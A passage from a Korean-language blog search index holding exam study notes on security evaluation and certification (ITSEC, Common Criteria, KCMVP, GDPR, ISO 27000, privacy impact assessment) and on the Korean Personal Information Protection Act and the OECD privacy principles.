Criteria   운영체제와 장치를 평가하기 위한 유럽형 지침   기밀성, 무결성, 가용성을 다룸   TOE(Target of Evaluation) : 평가 대상 제품 또는 시스템   기능성과 보증을 분리하여 평가함            Functionality : F1 ~ F10(최고 등급)       Assurance : E0 ~ E6(최고 등급)           2. CC(Common Criteria) 인증  1. CC(Common Criteria, ISO 15408)     CCRA 가입국 간의 정보보호 제품에 대한 상호인증   ISO 15408 표준 : 국가 간 상호인증   세계 각국에서 사용되는 다양한 평가 지침이 포함   2. CC의 주요 제공 기능                  주요 특징       세부 설명                       PP (보호 프로파일, Protection Profile)       ⦁ 특정 고객의 요구를 충족시키는 제품의 기능성, 보증 관련 요구사항을 묶어 놓은 것 ⦁ ST의 일반적인 형태, 정보보안 요구사항을 구현하여 독립적으로 표현 ⦁ 보안제품의 기능과 보증 요구사항을 식별한 것                 ST (보안목표명세서, Security Target)       ⦁ 제품 평가 시 사용되는 기능성과 보증 관련 요구 사항을 포함한 제품의 명세서로서 벤더 또는 개발자에 의해 작성 ⦁ 평가 대상의 구성요소, 설계, 메커니즘을 명시 ⦁ 여러 PP에 대하여 작성 가능 -&gt; 각 PP의 일반적 보안요구 정의 ⦁ 제품과 비독립적이며 의존적임 ⦁ 보안 요구사항을 정의                 ToE (Target of Evaluation)       평가 대상 시스템이나 제품 ⦁ 보안제품에 대한 평가 명세서                 EAL (Evaluation Assuarance Level)       EAL1 ~ EAL7 최종 평가등급           3. CC의 구성                  구성       세부 설명                       1부       소개 및 일반 모델 : 용어 정의, 보안성 평가 개념 정의, PP/ST 구조 정의                 2부       ⦁ 보안 기능 요구사항(SFR, Security Function Requirement) : ToE의 보안 기능 정의 시 사용되는 표준화된 보안 기능 집합으로 11개의 기능 클래스가 있음 ⦁ 11개 기능 클래스 : F는 Function ⦁ 보안감사(FAU), 통신(FCO), 암호지원(FCS), 사용자 데이터 보호(FDP), 식별 및 인증(FIA), 보안 관리(FMT), 프라이버시(FRR), TSF 보호(FPT), 자원활용(FRU), ToE 접근(FTA), 안전한 경로/채널(FTP, 신뢰된 IT 제품 간의 통신 경로와 채널)                 3부       ⦁ 보증 요구사항(SAR, Security Assuarance Requirement) : ToE의 보증수준 정의 시 사용되는 표준화된 보증 내용 집합으로 7개의 보증 클래스가 있음 ⦁ 보안 요구사항 및 평가 보증 등급을 정의 ⦁ 7개의 보증 클래스 : A는 Assurance ⦁ PP/ST 평가(APE/ASE), 개발(ADV), 생명주기 지원(ALC), 설명서(AGD), 시험(ATE), 취약성 평가(AVA), 합성(ACP, 평가된 ToE 간 또는 평가되지 않은 ToE와 평가된 ToE 평가)           4. CC 평가등급                  CC 평가등급       내용                       EAL7       정형화된 설계 검증 및 시험                 EAL6       준 정형화된 설계 검증 및 시험                 EAL5       준 정형화된 설계 및 시험                 EAL4       체계적인 설계, 시험 및 검토                 EAL3       체계적인 시험 및 검사                 EAL2       구조적인 시험                 EAL1       기능적인 시험           5. 국제공통평가기준상호인정협정(CCRA)     전 세계 국가 간 정보보호 제품에 대한 인증을 상호 인정하는 협정   1998년 미국을 중심으로 영국, 프랑스, 캐나다, 독일 등 7개국이 맺은 협정   각국은 보안 제품 평가인증 기준을 공통평가기준(CC)으로 표준화   CC를 통과한 정보보호 제품이 수출될 경우 협정국 간 별도의 평가절차를 거치지 않음   6. CC 평가 과정     보호 프로파일 (PP, Protection Profile)            구현에 독립적이며 여러 제품이 동일한 PP를 수용할 수 있다.       PP는 ST 수용이 불가능하다.           보안 목표명세서 (ST, Security Target)            구현에 종속적이며 하나의 제품은 동일한 ST 제품 간에만 수용할 수 있다.       ST는 PP 수용이 가능하다.           ToE(Target of Evaluation)            PP (Protection Profile) 구성                    보호 프로파일 소개           ToE 설명           ToE 보안 환경           보안 목적           IT 보안 요구사항           보호 프로파일 응용 시 주의 사항           이론적 근거                       ST (Security Target) 구성                    보안 목표명세서 소개           ToE 설명           ToE 보안 환경           보안 목적           IT 보안 요구사항           ToE 요약명세           보호 프로파일 수용           이론적 근거                           7. KCMVP(Korea Cryptographic Module Validation Program)     전자정부시행령 제69조 &lt;암호모듈 시험 및 검증지침&gt;에 의거하여 암호모듈의 안전성과 구현 적합성을 검증하는 제도   KCMVP는 미국의 CMVP 와 일본의 JCMVP 등과 호환되지 않고 국내에서 사용하는 독자적 인증제도이다.   3. GDPR(General Data Protection Regulation) 인증  1. 개념     유럽 위원회가 제안한 것으로 유럽연합(EU) 내의 개인 데이터 보호 기능을 강화하고 통합하는 개인정보에 대한 EU 규정   28개의 모든 유럽 회원국에 공통으로 적용되는 법률로써 정보주체와 기업의 책임성 강화, 개인정보의 EU 역외이전 요건 명확화 등을 주요 내용으로 함   2. GDPR 적용 기업     지점, 판매소, 영업소 등을 EU에서 사업장을 운영하는 기법   EU 지역에 사업장은 없지만, 인터넷 홈페이지를 사용해서 EU 거주 주민에게 물품, 서비스를 제공하는 기업(현지어로 마케팅을 하거나 현지 통화로 결제하는 경우)   EU에 거주하는 주민의 행동을 모니터하는 기업   EU 주민의 민감한 정보(건강, 유전자, 범죄경력 등)를 처리하거나, 아동의 정보를 처리하는 기업   공개적으로 접근 가능한 장소에 대한 대규모의 체계적인 모니터링을 하는 기업(예: CCTV)   3. GDPR의 주요 원칙     개인정보의 처리 원칙            적법성, 공정성, 투명성의 원칙, 목적 제한의 원칙, 개인정보처리의 최소화, 정확성의 원칙, 보관기간 제한의 원칙, 무결성 및 기밀성, 책임성을 기본원칙으로 함.       다음 6가지 경우에는 개인정보를 적법하게 처리(수집,이용,제공 등)해야 함                    정보주체의 동의           정보주체와 계약 이행이나 계약 체결을 위해 필요한 처리           법적 의무 이해을 위해 필요한 처리           정보주체 또는 다른 사람의 중대한 이익을 위해 필요한 처리           공익을 위한 임무의 수행 또는 기업에게 부여된 공적 권한의 행사를 위해 필요한 처리           기업 또는 제3자의 적법한 이익 추구 목적을 위해 필요한 처리                           동의(Consent)            정보주체가 진술 또는 적극적 행동을 통하여 자신의 개인정보 처리에 대한 긍정의 의사를 표현하는 것       GDPR은 동의 방법에 구체성(unambiguous, clear affirmative action) 추가           아동 개인정보(Children’s personal data)            ‘만 16세 미만의 아동’에게 온라인 서비스 제공 시 ‘아동의 친권을 보유하는 자’의 동의를 얻어야 함       회원국 법률로 만 13세 미만까지 낮추어 규정이 가능           민감 정보(Special categories of personal data)            정보주체의 명시적 동의가 있는 경우 또는 회원국 법류에 따른 경우 등을 제외하고는 민감정보의 처리는 원칙금으로 금지된다.       민감정보의 범위 : 인종,민족, 정치적 견해, 종교,철학적 신념, 노동조합의 가입여부를 나타내는 개인정보의 처리와 유전자 정보, 자연인을 고유하게 식별할 수 있는 생체정보, 건강정보, 성생활,성적 취향에 관한 정보의 처리는 금지된다.       민감 정보 처리가 가능한 경우                    정보주체의 명시적 동의(explicit consent)의 경우           고용, 사회안보나 사회보장법 또는 단체협약에 따른 의무 이행을 위해 필요한 경우           정보주체가 일반에게 공개한 것이 명백한 경우 등                           4. 정보주체의 권리                  권리       주요 내용                       처리제한권       정보주체는 본인에 관한 개인정보의 처리를 차단하거나 제한을 요구할 권리를 가진다.                 정보이동권       정보주체는 본인의 개인정보를 본인 또는 다른 사업자에게 전송하도록 요구할 권리를 가진다.                 삭제권       정보주체는 본인에 관한 개인정보 삭제를 요구할 권리를 가진다.                 프로파일링 거부권       정보주체는 본인에게 중대한 영향을 미치는 사안을 프로파일링 등 자동화된 처리에 의해서만 결정하는 것에 반대할 권리를 가진다.           5. 기업 책임성 강화를 위한 조치사항     DPO(Data Protection Officer)를 지정하고 개인정보처리 활동의 기록, 대리인 지정, 개인정보 영향평가 등 기업의 책임성을 강화한다.                  조치사항       주요 내용                       개인정보 처리 활용의 기록       ⦁ 피고용인이 250명 이상인 경우는 GDPR 준수를 입증하기 위해서 개인정보 처리활동의 기록(문서화)를 유지해아 한다. ⦁ 피고용인이 250명 이하여도 (1) 정보주체 권리와 자유에 위험을 초래하는 경우, (2) 민감정보 처리, (3) 유죄판결 및 형사범죄에 관련된 개인정보 처리 시 처리활동을 기록해야 한다.                 대리인 지정       EU역외에서 개인정보를 대규모로 처리하거나 민감정보 처리 시 EU역내에 대리인을 지정한다.                 개인정보 영향평가       기업은 개인정보 영향평가를 통해서 개인정보 처리 관련 문제점을 조기에 발견 및 해결하여 추후 발생할 수 있는 비용 소모와 평판침해의 위험을 최소화한다.                 기본적인 데이터 보호       사업 시작단계부터 개인정보보호를 위한 기술적, 조직적 조치 및 정기적 검사와 평가를 해야 한다.           6. 개인정보 역외 이전     EU가 인정한 적정수준의 보호조치 하에 자유로운 EU 역외 이전이 가능하다.                  구분       주요 내용                       표준계약       EU 집행위가 승인한 표준 조항이 반영된 계약을 통해 개인정보를 이전하는 경우                 의무적 기업규칙       관할 감독기관이 승인한 구속력이 있는 의무적 기업규칙에 따라 이전하는 경우                 행동강령       EU 집행위가 공인한 행동강령에 따른 이전                 인증       EU 정보보호 인증을 받은자에게 이전                 기타       정보주체의 명시적 동의, 중요한 공익상 이유 등           4. 클라우드 컴퓨팅 서비스 보안 인증제도  1. 클라우드 컴퓨팅 서비스 보안 인증제도 근거     클라우드 컴퓨팅 발전 및 이용자 보호에 관한 법률 제4장 제23조(신뢰성 향상)            과학기술정보통신부장관은 클라우드컴퓨팅서비스의 품질,성능에 관한 기준 및 정보보호에 관한 기준(관리적,물리적,기술적 보호조치를 포함한다)을 정하여 고시하고, 클라우드컴퓨팅서비스 제공자에게 그 기준을 지킬 것을 권고할 수 있다.       과학기술정보통신부장관이 제2항에 따라 클라우드컴퓨팅서비스의 품질, 성능에 관한 기준을 고시하려는 경우에는 미리 방송통신위원회의 의견을 들어야 한다.           2. 클라우드 서비스 유형(평가대상)     클라우드 서비스는 IaaS, SaaS, PaaS가 있으며 PaaS는 인증 수요가 적어서 인증 평가대상에서 제외됨            IaaS(Infrastructure as a Service) : 컴퓨팅 자원, 스토리지 등 정보시스템의 인프라를 제공하는 서비스       SaaS(Software as a Service) : 각종 애플리케이션을 제공하는 서비스       PaaS(Platform as a Service) : 클라우드 서비스를 개발할 수 있는 환경을 제공하는 서비스       SECaaS(Security as a Service) : SECaaS는 SaaS의 하나로 클라우드 기반으로 보안 서비스를 제공하는 것을 의미한다.           클라우드 컴퓨팅 발전 및 이용자 보호에 관한 법률 시행령            제3조(클라우드컴퓨팅서비스) 법 제2조 제3조에서 “대통령령으로 정하는 것”이란 다음 각호의 어느 하나에 해당하는 서비스를 말한다.                    서버, 저장장치, 네트워크 등을 제공하는 서비스           응용프로그램 등 소프트웨어를 제공하는 서비스           응용프로그램 등 소프트웨어의 개발,배포,운영,관리 등을 위한 환경을 제공하는 서비스           그 밖에 제1호부터 제3호까지의 서비스를 둘 이상 복합하는 서비스                           5. 개인정보 영향평가 제도  1. 정의     개인정보를 활용하는 새로운 정보시스템 도입 및 기존 정보시스템의 변경 시, 시스템의 구축 운영이 기업의 고객은 물론 고객의 프라이버시에 미칠 영향에 대하여 미리 조사 분석, 평가하는 체계적인 절차이다.   2. 개인정보 영향평가 대상     개인정보보호법 시행령 제35조(개인정보영향평가 대상)   법 제33조제1항에서 “대통령령으로 정하는 기준에 해당하는 개인정보파일”이란 개인정보를 전자적으로 처리할 수 있는 개인정보파일로서 다음 각호의 어느 하나에 해당하는 개인정보파일을 말한다.            구축,운용 또는 변경하려는 개인정보파일로서 5만명 이상의 정보주체에 관한 민감정보 또는 고유식별정보의 처리가 수반되는 개인정보파일       구축,운용하고 있는 개인정보파일을 해당 공공기관 내부 또는 외부에서 구축,운용하고 있는 다른 개인정보파일과 연계하려는 경우로서 연계 결과 50만명 이상의 정보주체에 관한 개인정보가 포함되는 개인정보파일       구축,운용 또는 변경하려는 개인정보파일로서 100만명 이상의 정보주체에 관한 개인정보파일       법 제33조제1항에 따른 개인정보 영향평가(이하 “영향평가”라 한다)를 받은 후에 개인정보 검색체계 등 개인정보파일의 운용체계를 변경하려는 경우 그 개인정보파일, 이 경우 영향평가 대상은 변경된 부분으로 한정한다.           3. 개인정보 영향평가 평가항목     읽어보기                  평가영역       평가분야       세부분야                       1.대상기관 개인정보보호 관리체계       1.1 개인정보보호조직       개인정보보호책임자의 지정 개인정보보호책임자 역할수행                         1.2 개인정보보호계획       내부관리계획 수립 개인정보보호 연간계획 수립                         1.3 개인정보 침해대응       침해사고 신고방법 안내 유출사고 대응                         1.4 정보주체 권리보장       정보주체 권리보장 절차 수립 정보주체 권리보장 방법 안내                 2.대상시스템의 개인정보보호 관리체계       2.1 개인정보취급자 관리       개인정보취급자 지정 개인정보취급자 관리,감독                         2.2 개인정보파일 관리       개인정보파일 대장 관리 개인정보파일 등록                         2.3 개인정보처리방침       개인정보처리방침의 공개 개인정보처리방침의 작성                 3.개인정보 처리 단계별 보호조치       3.1 수집       개인정보 제공의 적합성 목적 외 이용,제공 제한 제공시 안전성 확보                         3.2 보유       보유기간 산정                         3.3 이용, 제공       개인정보 제공의 적합성 목적 외 이용,제공 제한 제공시 안전성 확보                         3.4 위탁       위탁사실 공개 위탁 계약 수탁시 관리,감독                         3.5 파기       파기 계획 수립 분리보관 계획 수립 파기대장 작성                 4.대상시스템의 기술적 보호조치       4.1 접근권한 관리       계정관리 인증관리 권한관리                         4.2 접근 통제       접근 통제 조치 인터넷 홈페이지 보호조치 업무용 모바일기기 보호조치                         4.3 개인정보의 암호화       저장 시 암호화 전송 시 암호화                         4.4 접속기록의 보관 및 점검       접속기록 보관 접속기록 점검                         4.5 악성프로그램 방지 등       백신 설치 및 운영 보안 업데이트 적용                         4.6 물리적 접근방지       출입통제 절차 수립 반출입 통제 절차 수립                         4.7 개인정보의 파기       안전한 파기                         4.8 기타 기술적 보호조치       개발환경 통제 개인정보처리화면 보안 출력 시 보호조치                         4.9 개인정보처리 구역 보호       보호구역 지정                 5.특정IT 기술 활용 시 개인정보보호       5.1 CCTV       CCTV 설치 시 의견수렴 CCTV 설치 안내 CCTV 사용 제한 CCTV 설치 및 관리에 대한 위탁                         5.2 RFID       RFID 이용자 안내 RFID 태그부착 및 제거                         5.3 바이오 정보       원본정보 보관 시 보호조치                         5.4 위치정보       개인위치정보 수집 동의 개인위치정보 제공 시 안내사항           6. ISO 27000 표준  1. 정의     과거 영국에서 개발한 BS7799 인증을 기반으로 만들어진 국제표준 인증   BS7799 (ISO 27000)            Part 1 : ISO 17799       Part 2 : 정보보호 관리체계 ISMS (ISO 27001)           한국 인터넷진흥원 ISMS : BS7799를 기반으로 국내에서 개발   2. ISO 27000 Family(세부표준)                  유형       세부 내용                       ISO/IEC 27000 (Overview &amp; Vocabulary)       ISMS 수립 및 인증에 관한 원칙과 용어를 규정하는 표준                 ISO/IEC 27001 (ISMS requirements standard)       ISMS 수립,구현,운영,모니터링,검토,유지 및 개선하기 위한 요구사항을 규정                 ISO/IEC 27002 (code of practice for ISMS)       ISMS 수립, 구현 및 유지하기 위해 공통적으로 적용할 수 있는 실무적인 지침 및 일반적인 원칙                 ISO/IEC 27003 (ISMS Implementation Guide)       보안범위 및 자산정의, 정책시행, 모니터링과 검토, 지속적인 개선 등 ISMS 구현을 위한 프로젝트 수행 시 참고할 만한 구체적인 구현 권고사항을 규정한 규격으로, 문서 구조를 프로젝트 관리 프로세스에 맞춰 작성                 ISO/IEC 27004 (ISM Measurement)       ISMS에 구현된 정보보안통제의 유효성을 측정하기 위한 프로그램과 프로세스를 규정한 규격으로 무엇을, 어떻게, 언제 측정할 것인지를 제시하여 정보보안의 수준을 파악하고 지속적으로 개선시키기 위한 문서                 ISO/IEC 27005 (ISM Risk Management)       위험관리과정을 환경설정, 위험평가, 위험처리, 위험수용, 위험소통, 위험 모니터링 및 검토 등 6개의 프로세스로 구분하고, 각 프로세스 활동을 input, action, implementation, guidance, output으로 구분하여 기술한 문서                 ISO/IEC 27006 (Certification or registration process)       ISMS 인증기관을 인정하기 위한 요구사항을 명시한 표준으로서 인증기관 및 심사인의 자격요건 등을 기술                 ISO/IEC 27011 (ISM guideline for telecommunication organizations)       통신분야에 특화된 ISM 적용실무 지침으로서 ISO/IEC 27002와 함께 적용(ITU X.1051로 알려짐)                 ISO/IEC 27033 (IT network security)       네트워크시스템의 보안관리와 운영에 대한 실무 지침으로 ISO/IEC 27002의 네트워크보안통제를 구현관점에서 기술한 문서                 ISO/IEC 27799 (Health Organizations)       의료정보분야에 특화된 ISMS 적용 실무지침으로서 ISO/IEC 27002와 함께 적용          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","정보보호 관리"],
        "url": "https://bluesplatter.com/is_certification/ISCert-05ISM-01IS_Management/",
        "teaser": null
      },{
        "title": "05.정보보호 관리 - 02.정보보호 관련 윤리 및 법규",
        "excerpt":"정보보호 및 개인정보보호법 체계  1. 개인정보보호원칙          개인정보보호원칙의 의미                                  구분           내용                                           규범적 입장           선언적 규범 : 그 자체가 개인정보처리자를 직접적으로 구속하지 않는다.                             업무담당자 입장           ⦁ 개인정보처리자 : 행동의 지침을 제시한다. ⦁ 정책담당자 : 정책수립 및 법집행의 기준을 제시한다.                             헌법기관 입장           ⦁ 사법부가 법 해석의 이론적 기초를 제시한다. ⦁ 동시에 입법의 공백을 막아준다.                                국내 개인정보보호 원칙 : 개인정보보호법 제3조(개인정보보호원칙)             개인정보처리자는 개인정보의 처리 목적을 명확하게 하여야 하고 그 목적에 필요한 범위에서 최소한의 개인정보만을 적법하고 정당하게 수집하여야 한다.       개인정보처리자는 개인정보의 처리 목적에 필요한 범위에서 적합하게 개인정보를 처리하여야 하며, 그 목적 외의 용도로 활용하여서는 아니 된다.       개인정보처리자는 개인정보의 처리 목적에 필요한 범위에서 개인정보의 정확성, 완전성 및 최신성이 보장되도록 하여야 한다.       개인정보처리자는 개인정보의 처리 방법 및 종류 등에 따라 정보주체의 권리가 침해받을 가능성과 그 위험 정도를 고려하여 개인정보를 안전하게 관리하여야 한다.       개인정보처리자는 개인정보 처리방침 등 개인정보의 처리에 관한 사항을 공개하여야 하며, 열람청구권 등 정보주체의 권리를 보장하여야 한다.       개인정보처리자는 정보주체의 사생활 침해를 최소화하는 방법으로 개인정보를 처리하여야 한다.       개인정보처리자는 개인정보의 익명처리가 가능한 경우에는 익명에 의하여 처리될 수 있도록 하여야 한다.       개인정보처리자는 이 법 및 관계 법령에서 규정하고 있는 책임과 의무를 준수하고 실처함으로써 정보주체의 신뢰를 얻기 위하여 노력하여야 한다.           2. OECD 개인정보보호 8원칙     정의            ‘사생활 보호와 개인정보의 국가 간 이동에 관한 지침’이 OECD 이사회의 권고안으로 채택되고 프라이버시 8원칙이 지난 1980년 9월 23일 발효하였다.       이 8원칙은 개인정보의 수집 및 관리에 대한 국제사회의 합의를 반영한 국제기준으로, 법적인 구속력은 없지만, 개인정보보호의 일반 원칙으로 인정받고 있다.                OECD 프라이버시 8원칙                                  8원칙           설명                                           수집제한의 원칙 (Collection Limitation Principle)           개인정보의 수집은 적법하고 정당한 절차에 의하여 정보주체의 인지나 동의를 얻은 후 수집되어야 한다.                             정보의 정확성의 원칙 (Data Quality Principle)           개인정보는 그 이용목적에 부합되는 것이어야 하며 이용 목적에 필요한 범위 내에서 정확하고 완전하며 최신 상태를 유지해야 한다.                             목적 명확화의 원칙 (Purpose Specification Principle)           개인정보의 수집목적은 수집 시 특정되어 있어야 하며 그 후의 이용은 구체화된 목적달성 또는 수집목적과 부합되어야 한다.                             이용제한의 원칙 (Use Limitation Principle)           개인정보는 특정된 목적 이외의 다른 목적을 위하여 공개, 이용, 제공될 수 없다.                             안전성 확보의 원칙 (Security Safeguards Principle)           개인정보는 분실 또는 불법적인 접근, 파괴, 사용, 변조, 공개 위험에 대비하여 적절한 안전조치에 의하여 보호되어야 한다.                             (처리방침)공개의 원칙 (Openness Principle)           정보주체가 제공한 개인정보가 어떠한 용도와 방식으로 이용,처리되고 있으며 개인정보보호를 위하여 어떠한 조치를 취하고 있는지를 공개하여야 하며, 정보 주체가 자신의 정보에 대하여 쉽게 확인할 수 있어야 한다.                             정보주체의 참여의 원칙 (Individual Participation Principle)           정보주체가 제공한 개인정보를 열람, 정정 및 삭제를 요구할 수 있는 절차를 마련하여야 한다.                             책임의 원칙 (Accountability Principle)           정보관리자 또는 개인정보처리자는 8원칙이 지켜지도록 필요한 제반 조치를 취하여야 할 책임이 있다.                           3. 정보시스템 이용자 및 개인정보취급자의 금지(예방)행위     정보시스템 이용자의 개인정보 예방활동            이용자가 게시판에 글을 올릴 때 개인정보가 있는지 확인해야 한다.       개인정보를 삭제할 수 없다면, 마스킹 처리 후 업로드 한다.       개인정보가 포함된 게시글은 비밀글로 설정한다.           개인정보취급자의 개인정보 노출 예방활동            개인정보취급자는 개인정보처리자의 지휘, 감독을 받아 개인정보를 처리하는 임직원, 파견근로자, 시간제근로자 등을 의미한다.       게시판 운영 시에 개인정보 노출에 대한 안내를 해야 한다.       관리자 페이지는 외부접속 차단, 패스워드 관리 등에 대해서 보호해야 한다.       홈페이지의 개인정보 노출여부를 점검해야 한다.           정보보호 관련 법제 및 개요  1. 정보통신망 이용촉진 및 정보보호 등에 관한 법률     정보통신망법의 보호영역            정보통신망법에 있는 개인정보보호 관련 조항은 기본적으로 정보통신서비스제공자와 ‘이용자’ 간의 관계를 규정하고 있다.           정보통신망법 적용대상            정보통신서비스 제공자                    기간통신사업자, 별정통신사업자, 부가통신사업자, 영리를 목적으로 전기통신사업자의 전기통신역무를 이용해 정보를 제공하거나 매개하는 자                       정보통신서비스 제공자로부터 이용자의 개인정보를 제공받은 자       개인정보의 취급 업무를 위탁받은 자(준용)       방송사업자(준용)       다른 법률에서 정보통신망법의 준용을 명시한 경우           2. 개인정보보호법  1. 개인정보보호법 제정 후 대상 및 범위                  구분       제정 후                       적용대상       공공,민간의 모든 개인정보처리자 (통합규율 법적용 확대)                 세부 적용대상       ⦁ 포털, 금융기관, 병원, 학원, 제조업, 서비스업 등 360만 사업자 ⦁ 부처, 지자체, 공사, 공단, 학교 등 20만 공공기관                 적용범위       전자파일 외에 동창회 명부, 민원서류, 이벤트 응모권 등 수기문서 포함           2. 개인정보보호법 주요내용     제2조(정의)            “개인정보”란 살아 있는 개인에 관한 정보로서 성명, 주민등록번호 및 영상 등을 통하여 개인을 알아볼 수 있는 정보(해당 정보만으로는 특정 개인을 알아볼 수 없더라도 다른 정보와 쉽게 결합하여 알아볼 수 있는 것을 포함한다)를 말한다.       “정보주체”란 처리되는 정보에 의하여 알아볼 수 있는 사람으로서 그 정보의 주체가 되는 사람을 말한다.       “개인정보처리자”란 업무를 목적으로 개인정보파일을 운용하기 위하여 스스로 또는 다른 사람을 통하여 개인정보를 처리하는 공공기관, 법인, 단체 및 개인 등을 말한다.           제15조(개인정보의 수집,이용)            개인정보처리자는 다음 각 호의 어느 하나에 해당하는 경우에는 개인정보를 수집할 수 있으며 그 수집 목적의 범위에서 이용할 수 있다.                    정보주체의 동의를 받은 경우           법률에 특별한 규정이 있거나 법령상 의무를 준수하기 위하여 불가피한 경우           공공기관이 법령 등에서 정하는 소관 업무의 수행을 위하여 불가피한 경우           정보주체와의 계약의 체결 및 이행을 위하여 불가피하게 필요한 경우           정보주체 또는 그 법정대리인이 의사표시를 할 수 없는 상태에 있거나 주소불명 등으로 사전 동의를 받을 수 없는 경우로서 명백히 정보주체 또는 제3자의 급박한 생명, 신체, 재산의 이익을 위하여 필요하다고 인정되는 경우           개인정보처리자의 정당한 이익을 달성하기 위하여 필요한 경우로서 명백하게 정보주체의 권리보다 우선하는 경우. 이 경우 개인정보처리자의 정당한 이익과 상당한 관련이 있고 합리적인 범위를 초과하지 아니하는 경우에 한한다.                       개인정보처리자는 제1항 제1호에 따른 동의를 받을 때에는 다음 각호의 사항을 정보주체에게 알려야 한다. 다음 각호의 어느 하나의 사항을 변경하는 경우에도 이를 알리고 동의를 받아야 한다.                    개인정보의 수집,이용 목적           수집하려는 개인정보의 항목           개인정보의 보유 및 이용 기간           동의를 거부할 권리가 있다는 사실 및 동의 거부에 따른 불이익이 있는 경우에는 그 불이익의 내용                           제16조(개인정보의 수집 제한)            개인정보처리자는 제15조 제1항 각호의 어느 하나에 해당하여 개인정보를 수집하는 경우에는 그 목적에 필요한 최소한의 개인정보를 수집하여야 한다. 이 경우 최소한의 개인정보 수집이라는 입증책임은 개인정보처리자가 부담한다.       개인정보처리자는 정보주체의 동의를 받아 개인정보를 수집하는 경우 필요한 최소한의 정보 외의 개인정보수집에는 동의하지 아니할 수 있다는 사실을 구체적으로 알리고 개인정보를 수집하여야 한다.       개인정보처리자는 정보주체가 필요한 최소한의 정보 외의 개인정보 수집에 동의하지 아니한다는 이유로 정보주체에게 재화 또는 서비스의 제공을 거부하여서는 아니 된다.           제18조(개인정보의 목적 외 이용,제공 제한)            제1항에도 불구하고 개인정보처리자는 다음 각호의 어느 하나에 해당하는 경우에는 정보주체 또는 제3자의 이익을 부당하게 침해할 우려가 있을 때를 제외하고는 개인정보를 목적 외의 용도로 이용하거나 이를 제3자에게 제공할 수 있다. 다만, 제5호부터 제9호까지의 경우는 공공기관의 경우로 한정한다.                    정보주체로부터 별도의 동의를 받은 경우           다른 법률에 특별한 규정이 있는 경우           정보주체 또는 그 법정대리인이 의사표시를 할 수 없는 상태에 있거나 주소불명 등으로 사전 동의를 받을 수 없는 경우로서 명백히 정보주체 또는 제3자의 급박한 생명,신체,재산의 이익을 위하여 필요하다고 인정되는 경우           통계작성 및 학술연구 등의 목적을 위하여 필요한 경우로서 특정 개인을 알아볼 수 없는 형태로 개인정보를 제공하는 경우           (공공기관) 개인정보를 목적 외의 용도로 이용하거나 이를 제3자에게 제공하지 아니하면 다른 법률에서 정하는 소관 업무를 수행할 수 없는 경우로서 보호위원회의 심의,의결을 거친 경우           (공공기관) 조약, 그 밖의 국제협정의 이행을 위하여 외국정부 또는 국제기구에 제공하기 위하여 필요한 경우           (공공기관) 범죄의 수사와 공소의 제기 및 유지를 위하여 필요한 경우           (공공기관) 법원의 재판업무 수행을 위하여 필요한 경우           (공공기관) 형 및 감호, 보호처분의 집행을 위하여 필요한 경우                           제21조(개인정보의 파기)            개인정보처리자는 보유기간의 경과, 개인정보의 처리 목적 달성 등 그 개인정보가 불필요하게 되었을 때에는 지체 없이 그 개인정보를 파기하여야 한다. 다만, 다른 법령에 따라 보존하여야 하는 경우에는 그러하지 아니하다.       개인정보처리자가 제1항에 따라 개인정보를 파기할 때에는 복구 또는 재생되지 아니하도록 조치하여야 한다.       개인정보처리자가 제1항 단서에 따라 개인정보를 파기하지 아니하고 보존하여야 하는 경우에는 해당 개인정보 또는 개인정보파일을 다른 개인정보와 분리하여서 저장,관리하여야 한다.       개인정보의 파기 방법 및 절차 등에 필요한 사항은 대통령령으로 정한다.           제23조(민감정보의 처리 제한)            개인정보처리자는 사상,신념, 노동조합,정당의 가입,탈퇴, 정치적 견해, 건강, 성생활 등에 관한 정보, 그 밖에 정보주체의 사생활을 현저히 침해할 우려가 있는 개인정보로서 대통령령으로 정하는 정보(이하 “민감정보”라 한다)를 처리하여서는 아니 된다.           제24조(고유식별정보의 처리 제한)            개인정보처리자는 다음 각호의 경우를 제외하고는 법령에 따라 개인을 고유하게 구별하기 위하여 부여된 식별정보로서 대통령령으로 정하는 정보(이하 “고유식별정보”라 한다)를 처리할 수 없다.                    정보주체에게 제15조 제2항 각 호 또는 제17조 제2항 각호의 사항을 알리고 다른 개인정보의 처리에 대한 동의와 별도로 동의를 받은 경우           법령에서 구체적으로 고유식별정보의 처리를 요구하거나 허용하는 경우                       개인정보처리자가 제1항 각 호에 따라 고유식별정보를 처리하는 경우에는 그 고유식별정보가 분실,도난,유출,위조,변조 또는 훼손되지 아니하도록 대통령령으로 정하는 바에 따라 암호화 등 안전성 확보에 필요한 조치를 하여야 한다.           제24조의2(주민등록번호 처리의 제한)            제24조 제1항에도 불구하고 개인정보처리자는 다음 각호의 어느 하나에 해당하는 경우를 제외하고는 주민등록번호를 처리할 수 없다.                    법령에서 구체적으로 주민등록번호의 처리를 요구하거나 허용한 경우           정보주체 또는 제3자의 급박한 생명, 신체, 재산의 이익을 위하여 명백히 필요하다고 인정되는 경우           제1호 및 제2호에 준하여 주민등록번호 처리가 불가피한 경우로서 행정안전부령으로 정하는 경우                       개인정보처리자는 제24조 제3항에도 불구하고 주민등록번호가 분실,도난,유출,위조,변조 또는 훼손되지 아니하도록 암호화 조치를 통하여 안전하게 보관하여야 한다. 이 경우 암호화 적용 대상 및 대상별 적용 시기 등에 관하여 필요한 사항은 개인정보의 처리 규모와 유출 시 영향 등을 고려하여 대통령령으로 정한다.       개인정보처리자는 제1항 각 호에 따라 주민등록번호를 처리하는 경우에도 정보주체가 인터넷 홈페이지를 통하여 회원으로 가입하는 단계에서는 주민등록번호를 사용하지 아니하고도 회원으로 가입할 수 있는 방법을 제공하여야 한다. &lt;개정 2014.3.24.&gt;       행정안전부장관은 개인정보처리자가 제3항에 따른 방법을 제공할 수 있도록 관계 법령의 정비, 계획의 수립, 필요한 시설 및 시스템의 구축 등 제반 조치를 마련,지원할 수 있다. &lt;본조신설 2013.8.6&gt; &lt;시행일:2017.3.30.&gt;제24조의2 제1항 제1호           제25조(영상정보처리기기의 설치,운영 제한)            누구든지 다음 각호의 경우를 제외하고는 공개된 장소에 영상정보처리기기를 설치,운영하여서는 아니 된다.                    법령에서 구체적으로 허용하고 있는 경우           범죄의 예방 및 수사를 위하여 필요한 경우           시설안전 및 화재 예방을 위하여 필요한 경우           교통단속을 위하여 필요한 경우           교통정보의 수집,분석 및 제공을 위하여 필요한 경우                       누구든지 불특정 다수가 이용하는 목욕실, 화장실, 발한실, 탈의실 등 개인의 사생활을 현저히 침해할 우려가 있는 장소의 내부를 볼 수 있도록 영상정보처리기기를 설치,운영하여서는 아니 된다. 다만, 